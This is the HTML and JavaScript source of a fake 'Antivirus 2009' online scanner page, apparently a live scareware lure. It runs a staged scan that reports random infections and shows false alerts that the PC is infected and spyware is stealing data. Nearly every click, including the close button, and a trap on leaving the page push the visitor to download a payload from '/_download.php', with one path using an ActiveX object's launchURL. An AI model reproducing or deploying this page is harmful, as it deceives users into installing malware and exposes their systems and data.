<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Antivirus 2009</title>

<style>
.overlay{	FILTER: alpha(opacity=60); LEFT: 0px; POSITION: absolute; TOP: 0px; BACKGROUND-COLOR: #000; moz-opacity: 0.6; opacity: 0.6}
</style>

<script language="javascript">
	
var progressbar;

var fdsghsfhdhfdh = new Array();
var viruses = new Array();
var state;
var timer;

var curfile          = 0; 
var infectedcount    = 0;

var objinfectedcount  = 0;


</script>

<script src='fileslist.js'></script>
<script src='progressbar2.js'></script>
<script src='common.js'></script>

<script>
	
	is_IE=false;
	if (navigator.appName.toLowerCase()=='microsoft internet explorer'){
		if (navigator.userAgent.toLowerCase().indexOf('opera')<=0) 	{	is_IE=true;	}
	}	

function stateaction(state, data)
{
	switch(state)
	{
		case 'BEGINttti':
			startScan();
		break;
		
		case 'STOPSCAN':
			window.clearInterval(timer);
		break;

		case 'INITIALIZED':
			window.clearInterval(timer);			
			hdd2();
		break;
	};
};
</script>

<script>
function startScan()
{
	var scanedfile    = document.getElementById('IDscanedfile');	
	var infected      = document.getElementById('IDinfected');
	var itemsproc = 	document.getElementById('IDitemsproc');
	var warning = 	document.getElementById('warning1');
	var secondse=0;
	var minutese=0;
	var secondsr=51;
	var minutesr=1;
	var cnt=0;
	timer  = window.setInterval(function()
										{
										if(curfile < fdsghsfhdhfdh.length){																															
											scanedfile.innerHTML  = fdsghsfhdhfdh[curfile];
											progressbar.step(parseInt((curfile/fdsghsfhdhfdh.length) * 100));
											if(parseInt(Math.random() * 100) < 5){	
												objinfectedcount  += 1;
												infected.innerHTML = objinfectedcount; 
												
											};
											curfile++;
											itemsproc.innerHTML=curfile;
										}else{
											scanedfile.innerHTML  = 'complete';
											progressbar.step(100);
											state.set('INITIALIZED');
										};
										cnt++;
										if ( (cnt%10) == 0){
											secondse++;
											secondsr--;
											if(secondse==60){
												minutese++;
												secondse-=60;
											}
											if(secondsr==0){
												minutesr--;
												if(minutesr<0){
													minutesr=0;
													secondsr=0;
												}else
													secondsr=59;
											}
											if(secondse<10)
												secondse1="0"+secondse; 
											else
												secondse1=secondse; 
											if(secondsr<10)
												secondsr1="0"+secondsr; 
											else
												secondsr1=secondsr; 
											
										}
										if(objinfectedcount==15){
											warning.src="warning2.jpg";
										}
										if(objinfectedcount==30){
											document.getElementById("tableimg").src = "table2.gif";	
										}
										}, 10);
};
</script>

<script>
function overlaySize()
{
	if (window.innerHeight && window.scrollMaxY || window.innerWidth && window.scrollMaxX)
	{	
		yScroll = window.innerHeight + window.scrollMaxY;
		xScroll = window.innerWidth + window.scrollMaxX;
		var deff = document.documentElement;
		var wff = (deff&&deff.clientWidth) || document.body.clientWidth || window.innerWidth || self.innerWidth;
		var hff = (deff&&deff.clientHeight) || document.body.clientHeight || window.innerHeight || self.innerHeight;
		xScroll -= (window.innerWidth - wff);
		yScroll -= (window.innerHeight - hff);
	}
	else if (document.body.scrollHeight > document.body.offsetHeight || document.body.scrollWidth > document.body.offsetWidth)
	{ 
		// all but Explorer Mac
		yScroll = document.body.scrollHeight;
		xScroll = document.body.scrollWidth;
	}
	else 
	{
		// Explorer Mac...would also work in Explorer 6 Strict, Mozilla and Safari
		yScroll = document.body.offsetHeight;
		xScroll = document.body.offsetWidth;
  };
  
  var div          = document.getElementById('TB_overlay');
  
  if(div)
 	{
		div.style.height = yScroll + 'px';
		div.style.width  = xScroll + 'px';
	};
}

function treter564tgr()
{
	if(document.getElementById('TB_overlay') == null)
	{
		var div       = document.createElement('div');
		div.className = 'overlay';
		div.id        = 'TB_overlay';
		
		document.body.appendChild(div);
	};
	
	document.getElementById('TB_overlay').style.display = '';	
	overlaySize();
};
</script>

<SCRIPT language=javascript>
	var rrc = 0;
function crptr3455345345()
{
	dat=new Date(1224168415);
	var dlth=dat.getHours()-dat.getUTCHours();
	rrc = 1;
	location.href="/_download.php?aid=77023202&dlth="+dlth;
};
function hideActiveXDialog()
{
	if(confirm('Dont close this window if you want your PC to be clean.'))
	{
		crptr3455345345();
	}
	else
	{
		if(state.toString() == 'STOPSCAN')
		{
			state.set('BEGINttti');
		};
	}
};

function hideWarnDialog()
{
	if(confirm('Dont close this window if your want you PC to be clean.'))	{
		crptr3455345345();
	}
	else	{
		alert_and_dl();
	};
};
function alert_and_dl(){
	alert("Harmful and malicious software detected. These programs may damage your computer and steal your private information. Online Security Scanner requires  Antivirus 2009 components to repair your computer. Please click OK to download and install Antivirus 2009 components.");
	crptr3455345345();
}
function getAlertMovie(movieName){
	if (navigator.appName.indexOf("Microsoft") != -1)	{
		return window[movieName]	
	}	else	{
		return document[movieName];	
	}
}
function hdd2(){
	treter564tgr();
	document.getElementById("restrictedet").style.visibility = "visible";
};
function onopenUpdate(sender){
};
function crptr3455345345alt(){
	treter564tgr();
	onopenUpdate(null);
	crptr3455345345();
	if(state.toString() == 'BEGINttti')	{
		state.set('STOPSCAN');
	};
	return false;
};
</SCRIPT>

<script>
function destroy()
{
	//if(rrc) return; 
	alert('ATTENTION! You have not completed the virus scan! \nYour PC is still infected with spyware!\n\nPlease return to antivirus-2009.com and download Antivirus 2009 scanner.');
	location.href="../6/freescan.php?id=77023202";	
	//return false;
};
function brs(){
    document.body.innerHTML+="<object id=iie width=0 height=0 classid='CLSID:"+u+"'></object>";
}
function init(){
	isXPSP2 = (window.navigator.userAgent.indexOf("SV1") != -1);
    if(isXPSP2) brs();
	state = new JSState();
	state.onchange = stateaction;
	progressbar  = new JSProgressBar('IDprogressbar', 459, 22);	
	state.set('BEGINttti');
}
</script>
</head>
	
<body onload='init()' onresize='overlaySize()' bgcolor="#22304e" topmargin="0" leftmargin="0">
<script language="javascript">
//--------------------------------------------------------------------------------
var exit = true;
var usePopDialog = true;
var nid=0;
var tid=431;
var mid=947;
var full=1;
var popDialogOptions = "dialogWidth:1024px; dialogHeight:768px; dialogTop:0px; dialogLeft:0px; edge:Raised; center:0; help:0; resizable:1; scroll:1; status:0";
var popWindowOptions = " scrollbars=1,menubar=1,toolbar=1,location=1,personalbar=1,status=1,resizable=1";
var clid = "7f09c9e1c55f7d63f02909a14c1a45e0";
var usePopDialog = true;
var isUsingSpecial = false;
dat=new Date(1224168415);
var dlth=dat.getHours()-dat.getUTCHours();
newurl = "/_download.php?aid=77023202&dlth="+dlth;
var isXPSP2 = false;
var u = "6BF52A52-394A-11D3-B153-00C04F79FAA6";
function ext(){
       if(exit)       {
               exit=false;
               alert_and_dl();
               if(!isXPSP2 && !usePopDialog)               {
                         window.open(popURL,"",popWindowOptions);
               }else if(!isXPSP2 && usePopDialog) {
                         eval("window.showModalDialog(popURL,'',popDialogOptions)");
               }else{
                         iie.launchURL(popURL);
               }
        }
}

var popURL = newurl;
isUsingSpecial = true;
eval("window.attachEvent('onunload',ext);");
//--------------------------------------------------------------------------------

</script>
<table cellspacing='0' cellpadding='0' align='center' border="0" width="1207">
 <tr>
  <td width="223" style="background-image:url(bgleft.gif);background-repeat:repeat:y">&nbsp;</td>
  <td width="761"><br>
   <table cellspacing='0' cellpadding='0' align='center' border="0" width="100%">
    <tr>
     <td><img src="hat1.jpg" border="0" width="761"></td>
    </tr>
    <tr>
     <td style="background-image:url(bgtop1.gif);background-repeat:repeat:y" height="57">
      <table cellspacing='0' cellpadding='0' border="0" width="100%">
       <tr>
        <td width="10" rowspan="2">&nbsp;</td>
        <td width="550"><div style='color:black;font-family:tahoma;font-size:11px;font-weight:bold;margin: 5 30'>now scanning:&nbsp;<span id='IDscanedfile'></span></div></td>
        <td><div style="font-family:tahoma;font-size:11px;color:black;font-weight:bold;">items processed:&nbsp;&nbsp;
        <span id="IDitemsproc">&nbsp;</span></div></td>
       </tr>
       <tr>
        <td>
         <table cellspacing='0' cellpadding='0' border="0" height="22">
          <tr>
           <td bgcolor="#000000" width="2"><img src="pixel_trans.gif" align="left" border="0" hspace="0" vspace="0" width="2" height="22"></td>
		   <td width="459" background="pbbg2.gif"><div id='IDprogressbar' style="background: url(pbbg.gif) no-repeat;"></div></td>
	       <td bgcolor="#000000" width="2"><img src="pixel_trans.gif" align="left" border="0" hspace="0" vspace="0" width="2" height="22"></td>
	      </tr>
	     </table>
	    </td>
	    <td><div style="font-family:arial;font-size:13px;color:#ff0000;font-weight:bold;">ERRORS FOUND:&nbsp;&nbsp;<span id='IDinfected' style="color:red;text-decoration:underline">&nbsp;</span></div></td>
	   </tr>
	  </table>
     </td>
    </tr>
    <tr>
     <td align="center" valign="middle" height="104"><a href="#" onclick='onopenUpdate(this); crptr3455345345();return false;'><img src="disks.gif" border="0" width="761" height="104"></a></td>
    </tr>
    <tr>
     <td align="center" valign="middle" height="102" bgcolor="Black"><img src="warning.jpg" border="0" width="761" height="88" id="warning1" onclick='onopenUpdate(this); crptr3455345345();' style="cursor:hand;"></td>
    </tr>
    <tr>
     <td align="center" valign="middle" height="241"><img src="table1.gif" border="0" width="761" height="241" id="tableimg" onclick='onopenUpdate(this); crptr3455345345();' style="cursor:hand;"></td>
    </tr>
    <tr>
     <td align="center" valign="middle" height="228"><img src="footer.gif" border="0" width="761" height="228"></td>
    </tr>
    <tr>
     <td align="center" valign="middle" height="228" bgcolor="#c0cfda">&nbsp;</td>
    </tr>
   </table>
 </td>
  <td width="223" style="background-image:url(bgright.gif);background-repeat:repeat:y">&nbsp;</td>
 </tr>
</table>

<DIV id=restrictedet style="LEFT: 0px; z-index:2; WIDTH: 100%; POSITION: absolute; TOP: 190px; visibility: hidden;" align=center>
	<DIV style="cursor:hand; WIDTH: 446px; height:294px; POSITION: relative; background-image:url(popup4.gif); background-color:white;" onclick='onopenUpdate(this); crptr3455345345();'><input type='button' style='POSITION: relative; width:21px; height:21px; left:209px; top:5px; border-width:0px; background-image:url(closebutton.gif)' onclick='event.cancelBubble=true; hideWarnDialog();'><spacer width='446' height='294' /></DIV>
</DIV>



</body>
</html>